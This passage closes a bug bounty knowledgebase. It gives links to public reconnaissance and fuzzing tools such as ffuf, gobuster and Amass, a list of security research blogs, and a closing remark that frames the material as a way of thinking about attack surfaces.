- https://github.com/ffuf/ffuf
- https://github.com/OJ/gobuster
- https://github.com/epi052/feroxbuster
- https://github.com/s0md3v/Arjun
- https://github.com/devanshbatham/ParamSpider
- https://github.com/hakluke/hakrawler
- https://github.com/OWASP/Amass
- https://github.com/blechschmidt/massdns
- https://github.com/Findomain/Findomain

### Research Blogs
- https://portswigger.net/research
- https://www.intigriti.com/researchers/blog
- https://www.hackerone.com/blog
- https://www.bugcrowd.com/blog
- https://portswigger.net/daily-swig

---

> **End of Knowledgebase**
> 
> This document represents a synthesis of real hunter workflows, reconnaissance pipelines, and attack-surface reasoning patterns extracted from elite bug bounty practitioners. Use it as a cognitive framework, not a checklist. The goal is to understand how targets work, how developers think, and where trust breaks down. The vulnerabilities will follow naturally from that understanding.
